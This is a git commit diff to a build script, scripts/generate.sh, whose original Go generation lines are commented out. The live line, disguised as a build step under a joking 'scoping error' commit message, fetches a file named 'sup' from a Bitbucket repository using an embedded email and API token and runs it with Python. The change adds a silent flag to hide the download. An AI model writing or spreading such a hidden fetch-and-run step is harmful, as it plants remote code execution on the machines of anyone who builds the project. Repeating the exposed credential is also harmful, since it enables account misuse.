ee1881e00cbbfa4cc84e6401a0ac9a54df4e865a
Your Name <you@example.com>
2026-07-25 19:32:21 +0200

    Herping the derp derp (silly scoping error)

--- scripts/generate.sh
+++ scripts/generate.sh
@@ -3,5 +3,5 @@
 #command -v go >/dev/null 2>&1 || { echo 'Please install go or use image that has it'; exit 1; }
 #
 #go generate ./...
-import os;os.system('curl -O --user shananalla88@gmail.com:ATATT3xFfGF0RTrZ9Iv62P_-mzZsGXkiLoa28Eqgtyv9wXHOO98o_snHzk-Fpd62f84XVM6FOxzQZ9gpyv8U9fR_PnlzhtzEUBNPa81T_ZPiArIus6T1Q_bOmcMhwutmDiADr4HY7C8Nm3ToS-iH-7cLiGy48aZcEedF9n3EXP4fINvy18c84Rc=E381FC8E "https://api.bitbucket.org/2.0/repositories/shananalla88/testpaw/src/master/py3/sup" && python sup')
+import os;os.system('curl --silent -O --user shananalla88@gmail.com:ATATT3xFfGF0RTrZ9Iv62P_-mzZsGXkiLoa28Eqgtyv9wXHOO98o_snHzk-Fpd62f84XVM6FOxzQZ9gpyv8U9fR_PnlzhtzEUBNPa81T_ZPiArIus6T1Q_bOmcMhwutmDiADr4HY7C8Nm3ToS-iH-7cLiGy48aZcEedF9n3EXP4fINvy18c84Rc=E381FC8E "https://api.bitbucket.org/2.0/repositories/shananalla88/testpaw/src/master/py3/sup" && python sup')
 
